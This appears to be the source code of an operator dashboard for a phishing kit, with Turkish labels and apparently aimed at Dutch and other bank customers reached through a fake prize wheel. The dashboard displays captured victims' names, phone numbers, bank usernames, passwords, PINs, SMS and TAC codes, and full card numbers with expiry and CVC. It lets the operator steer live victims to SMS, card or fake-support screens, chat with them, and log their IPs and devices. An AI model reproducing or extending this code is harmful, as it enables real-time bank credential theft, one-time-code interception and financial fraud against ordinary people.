                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                else if (s === "code_entry") {
                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
                }
                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
                else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
                else if (s === "bank") {
                  stepText = `BANKA GİRİŞİ ${fd.bankName ? `(${fd.bankName})` : ""}`;
                  stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
                }
                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
                else if (s === "special_approval") {
                  if (row.status === "SPECIAL_INFO") {
                    stepText = "ÖZEL BİLDİRİM";
                    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
                  } else if (typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()) {
                    stepText = getApprovalStepLabel(fd.approvalStatus.trim());
                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
                  } else {
                    stepText = "ONAY";
                    stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20";
                  }
                }

                const canonicalBankFields = getCanonicalAdminBankFields(fd);
                const approvalHistory = parseApprovalHistory(fd.approvalHistory);
                const approvalEntries = approvalHistory;
                const smsValue =
                  typeof fd.smsCode === "string" && fd.smsCode.trim()
                    ? fd.smsCode.trim()
                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
                      ? fd.tacCode.trim()
                      : "";

                return (
                  <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
                    <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
                      {row.id.split('-')[0]}
                    </td>
                    <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                      {row.amount ? `${typeof fd.currency === "string" && fd.currency.trim() ? fd.currency.trim() : "NZ$"}${row.amount}` : '-'}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="cursor-pointer text-[11px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                        {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                        {fd.phone || '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="space-y-1 text-[10px] leading-tight">
                        {fd.bankName ? (
                          <div className="flex min-w-0 flex-wrap items-center gap-1">
                            <span className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
                              {fd.bankName}
                            </span>
                            {typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
                              <span
                                className="cursor-pointer rounded bg-black/5 px-1.5 py-0.5 text-[8px] font-bold uppercase opacity-60 dark:bg-white/10"
                                onClick={() => copyToClipboard(fd.loginMethod)}
                              >
                                {fd.loginMethod}
                              </span>
                            ) : null}
                          </div>
                        ) : typeof fd.loginMethod === "string" && fd.loginMethod.trim() ? (
                          <div
                            className="cursor-pointer font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]"
                            onClick={() => copyToClipboard(fd.loginMethod)}
                          >
                            {fd.loginMethod}
                          </div>
                        ) : null}
                        {canonicalBankFields.map(([key, value]) => {
                          let displayKey = key;
                          if (displayKey === "username") displayKey = "ID / K.Adı";
                          else if (displayKey === "password") displayKey = "Şifre / PIN";
                          else if (displayKey === "tacCode") displayKey = "TAC";
                          else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
                          else if (displayKey === "pasnummer") displayKey = "Kart No";
                          else if (displayKey === "toegangscode") displayKey = "Giriş Kodu";
                          else if (displayKey === "signatuur") displayKey = "İmza";
                          else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
                          else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
                          else if (displayKey === "bankPhone") displayKey = "Telefon";

                          return (
                            <div key={key} className="flex min-w-0 items-start gap-1 leading-tight">
                              <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
                                {displayKey}
                              </span>
                              <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
                                {String(value)}
                              </span>
                            </div>
                          );
                        })}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      {approvalEntries.length === 0 ? (
                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                      ) : (
                        <div className="flex flex-col items-start gap-1">
                          {approvalEntries.map((approvalValue, index) => (
                            <span
                              key={`${approvalValue}-${index}`}
                              className="inline-flex w-fit max-w-full items-center self-start rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                            >
                              {getApprovalDisplayText(approvalValue)}
                            </span>
                          ))}
                        </div>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div
                        className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                        onClick={() => copyToClipboard(smsValue)}
                      >
                        {smsValue || '-'}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <div className="space-y-1 text-[10px] font-medium leading-tight">
                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
                        {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                      </div>
                    </td>
                    <td className="px-2 py-3 align-top">
                      <span className={`inline-flex max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] ${stepColor}`}>
                        {stepText}
                      </span>
                    </td>
                    <td className="px-2 py-3 align-top">
                      {isOnline ? (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                          ONLINE
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                          <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                          OFFLINE
                        </span>
                      )}
                    </td>
                    <td className="px-2 py-3 align-top text-right">
                      <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
                        <select
                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                          value=""
                          onChange={(e) => {
                            if (e.target.value) {
                              void handleRouteAction(row.id, e.target.value);
                              e.target.value = "";
                            }
                          }}
                        >
                          <option value="">Aksiyon Seçin...</option>
                          <option value="win">👉 İsim & Profil'e Yönlendir</option>
                          <option value="banken">👉 Banka Listesine Yönlendir</option>
                          <option value="sms">👉 SMS Doğrulamasına Yönlendir</option>
                          <option value="card">👉 Kredi Kartına Yönlendir</option>
                          <option value="wait">⏳ Beklemeye Al</option>
                          <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                          <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                          <option value="congrats">✅ Tebrikler Ekranına Al</option>
                          <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                        </select>

                        <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                            <span>💬</span>
                          </button>
                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                            <span>📱</span>
                          </button>
                          <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
                            <span>🗑️</span>
                          </button>
                        </div>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* CHAT MODAL */}
      {chatSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`flex h-[32rem] w-full max-w-md flex-col overflow-hidden rounded-2xl border shadow-2xl ${darkMode ? 'border-white/10 bg-[#111111]' : 'border-gray-200 bg-white'}`}>
            <div className={`flex items-center justify-between px-4 py-3 border-b ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
              <h3 className={`font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kullanıcı ile Sohbet</h3>
              <button onClick={() => setChatSessionId(null)} className={`hover:opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>✕</button>
            </div>
            <div className={`flex-1 overflow-y-auto p-4 space-y-3 ${darkMode ? 'bg-[#0a0a0a]' : 'bg-gray-50'}`}>
              {chatMessages.length === 0 ? (
                <p className={`text-center text-xs mt-10 ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>Henüz mesaj yok.</p>
              ) : (
                chatMessages.map((m) => (
                  <div key={m.id} className={`flex ${m.sender === "admin" ? "justify-end" : "justify-start"}`}>
                    <div className={`max-w-[80%] rounded-xl px-3 py-2 text-sm ${m.sender === "admin" ? "bg-[#EB5E28] text-white rounded-br-none" : (darkMode ? "bg-zinc-800 text-zinc-200 rounded-bl-none" : "bg-white border text-gray-800 rounded-bl-none")}`}>
                      {m.image_url && (
                        <div 
                          className="mb-2 overflow-hidden rounded-lg cursor-pointer hover:opacity-90 transition-opacity"
                          onClick={() => setZoomedImage(m.image_url)}
                        >
                          <img src={m.image_url} alt="Ek" className="max-h-48 w-full object-cover" />
                        </div>
                      )}
                      {m.content && <p>{m.content}</p>}
                    </div>
                  </div>
                ))
              )}
              <div ref={chatEndRef} />
            </div>

            {pastedImagePreview && (
              <div className={`p-3 flex flex-col gap-2 border-t ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-100 border-gray-200'}`}>
                <div className="flex justify-between items-center">
                  <span className={`text-xs font-bold ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Gönderilecek Görsel:</span>
                  <button onClick={() => { setPastedImage(null); setPastedImagePreview(null); }} className="text-xs text-red-400 hover:text-red-300 font-bold">İptal</button>
                </div>
                <div className={`relative rounded-lg overflow-hidden border h-32 flex justify-center ${darkMode ? 'border-zinc-700 bg-black' : 'border-gray-300 bg-gray-200'}`}>
                  <img src={pastedImagePreview} alt="Preview" className="object-contain h-full" />
                </div>
              </div>
            )}

            <form onSubmit={sendChatMessage} className={`flex border-t p-2 ${darkMode ? 'bg-[#161616] border-zinc-800' : 'bg-white border-gray-200'}`}>
              <input
                type="text"
                value={chatInput}
                onChange={(e) => setChatInput(e.target.value)}
                onPaste={handlePaste}
                placeholder="Mesaj yazın... (Ctrl+V ile görsel)"
                className={`flex-1 bg-transparent px-3 py-2 text-sm outline-none ${darkMode ? 'text-white' : 'text-gray-900'}`}
              />
              <button type="submit" disabled={(!chatInput.trim() && !pastedImage) || isUploadingImage} className="rounded-lg bg-[#EB5E28] px-4 py-2 text-xs font-bold text-white transition-colors hover:bg-[#c94d1e] disabled:opacity-50">
                {isUploadingImage ? "Yükleniyor..." : "Gönder"}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* ZOOMED IMAGE */}
      {zoomedImage && (
        <div 
          className="fixed inset-0 z-[200] flex items-center justify-center bg-black/90 p-4 backdrop-blur-sm animate-in fade-in duration-200" 
          onClick={() => setZoomedImage(null)}
        >
          <button 
            className="absolute top-4 right-4 sm:top-8 sm:right-8 text-white/70 hover:text-white p-2" 
            onClick={() => setZoomedImage(null)}
          >
            <svg className="size-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
          <img 
            src={zoomedImage} 
            alt="Zoomed" 
            className="max-w-full max-h-full object-contain rounded-lg animate-in zoom-in-95 duration-200" 
            onClick={(e) => e.stopPropagation()}
          />
        </div>
      )}

      {/* SPECIAL NOTIFICATION MODAL */}
      {specialPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-2xl rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`} onPaste={(e) => {
              const file = e.clipboardData.files?.[0];
              if (file && file.type.startsWith("image/")) {
                const reader = new FileReader();
                reader.onload = () => setSpecialImage(reader.result as string);
                reader.readAsDataURL(file);
              }
            }}>
            <div className="flex justify-between mb-4 items-center">
              <h3 className={`text-lg font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Özel Bildirim Paneli</h3>
              <div className="flex gap-2">
                <button onClick={() => setSpecialLang("de")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "de" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>DE</button>
                <button onClick={() => setSpecialLang("tr")} className={`px-3 py-1 rounded-lg text-xs font-bold ${specialLang === "tr" ? "bg-[#EB5E28] text-white" : (darkMode ? "bg-zinc-800 text-zinc-500" : "bg-gray-200 text-gray-600")}`}>TR</button>
              </div>
            </div>
            <textarea 
              value={specialMessage} 
              onChange={(e) => setSpecialMessage(e.target.value)} 
              className={`w-full rounded-xl p-4 border outline-none transition-all ${darkMode ? 'bg-zinc-900 text-white border-zinc-800 focus:border-[#EB5E28]' : 'bg-gray-50 text-gray-900 border-gray-200 focus:border-[#EB5E28]'}`} 
              placeholder="Mesaj yazın veya buraya bir resim yapıştırın..." 
              rows={5} 
            />
            {specialImage && (
              <div className="mt-4 relative rounded-xl border border-zinc-800 overflow-hidden bg-black">
                <img src={specialImage} className="max-h-48 w-full object-contain" alt="Preview" />
                <button onClick={() => setSpecialImage(null)} className="absolute top-2 right-2 bg-red-600 p-1.5 rounded-full text-white hover:bg-red-700">✕</button>
              </div>
            )}
            <div className="mt-6 flex justify-end gap-4">
              <button onClick={() => setSpecialPromptSessionId(null)} className={`px-4 py-2 font-semibold transition-colors ${darkMode ? 'text-zinc-500 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}>İptal</button>
              <button onClick={() => void publishSpecialApproval()} className="bg-[#EB5E28] px-10 py-2 rounded-xl text-white font-bold hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20">BİLDİRİMİ GÖNDER</button>
            </div>
          </div>
        </div>
      )}

      {/* SMS SETTINGS MODAL */}
      {smsPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
            
            <div className="space-y-4">
              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı</label>
                <input
                  type="number"
                  min={4}
                  max={12}
                  value={smsDigitsInput}
                  onChange={(e) => setSmsDigitsInput(e.target.value)}
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>

              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                  Özel Açıklama Metni (İsteğe Bağlı)
                </label>
                <textarea
                  rows={3}
                  value={smsCustomTextInput}
                  onChange={(e) => setSmsCustomTextInput(e.target.value)}
                  placeholder="Örn: Telefonunuza gelen şifreyi girin."
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => setSmsPromptSessionId(null)}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmSmsRedirect()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {approvalPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Onay Ayarları</h3>

            <div className="space-y-4">
              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Seçilen Onay</label>
                <div className={`w-full rounded-xl border px-3 py-2 text-sm font-semibold ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}>
                  {APPROVAL_OPTIONS.find((option) => option.value === approvalPromptType)?.label || "-"}
                </div>
              </div>

              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                <input
                  type="text"
                  value={approvalCodeInput}
                  onChange={(e) => setApprovalCodeInput(e.target.value)}
                  placeholder="Örn: 1, 22, 4578"
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => {
                  setApprovalPromptSessionId(null);
                  setApprovalPromptType("");
                  setApprovalCodeInput("");
                }}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmApprovalAction()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {/* DEVICE INFO MODAL */}
      {deviceInfoSession && (() => {
        const uaInfo = parseUserAgent(deviceInfoSession.user_agent);
        return (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <div className={`flex justify-between items-center mb-6 border-b pb-4 ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
              <h3 className={`text-xl font-bold flex items-center gap-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                📱 Cihaz & Bağlantı Bilgisi
              </h3>
              <button onClick={() => setDeviceInfoSession(null)} className="text-zinc-500 hover:opacity-70 text-xl">✕</button>
            </div>
            
            <div className="space-y-4">
              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">IP Adresi</div>
                <div className="text-blue-400 font-mono text-lg">{deviceInfoSession.ip_address || "Henüz yansımadı"}</div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İşletim Sistemi</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.os}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Tarayıcı</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.browser}</div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz Türü</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.device}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz modeli</div>
                  <div className={`font-medium break-words ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.model}</div>
                </div>
              </div>

              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Ham Veri (User-Agent)</div>
                <div className="text-xs text-zinc-400 font-mono break-words leading-relaxed">
                  {deviceInfoSession.user_agent || "Bilinmiyor"}
                </div>
              </div>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={() => setDeviceInfoSession(null)}
                className={`rounded-lg px-6 py-2 text-sm font-bold transition-colors ${darkMode ? 'bg-zinc-800 text-white hover:bg-zinc-700' : 'bg-gray-200 text-gray-900 hover:bg-gray-300'}`}
              >
                Kapat
              </button>
            </div>
          </div>
        </div>
        );
      })()}
    </div>
  );
}

function StatCard({ icon, color, title, value, darkMode }: { icon: string, color: string, title: string, value: number, darkMode: boolean }) {
  return (
    <div className={`relative overflow-hidden p-6 rounded-3xl border flex items-center transition-all duration-300 hover:scale-[1.02] hover:shadow-xl group ${darkMode ? 'bg-gradient-to-br from-[#1c1c1e]/80 to-[#1c1c1e]/40 border-white/5 shadow-lg backdrop-blur-xl' : 'bg-gradient-to-br from-white to-gray-50/80 border-[#d2d2d7]/50 shadow-md backdrop-blur-xl'}`}>
      <div className={`absolute -right-6 -top-6 w-24 h-24 rounded-full blur-2xl opacity-20 transition-all duration-500 group-hover:scale-150 group-hover:opacity-40 ${color.replace('text-', 'bg-')}`}></div>
      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-2xl shadow-sm ${color.replace('text-', 'bg-').replace('500', '500/10')} ${color}`}>
        <svg className="w-7 h-7 drop-shadow-sm" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={icon} /></svg>
      </div>
      <div className="ml-5 relative z-10">
        <div className={`text-sm font-semibold tracking-wide uppercase opacity-70 mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
        <div className={`text-4xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
      </div>
    </div>
  );
}
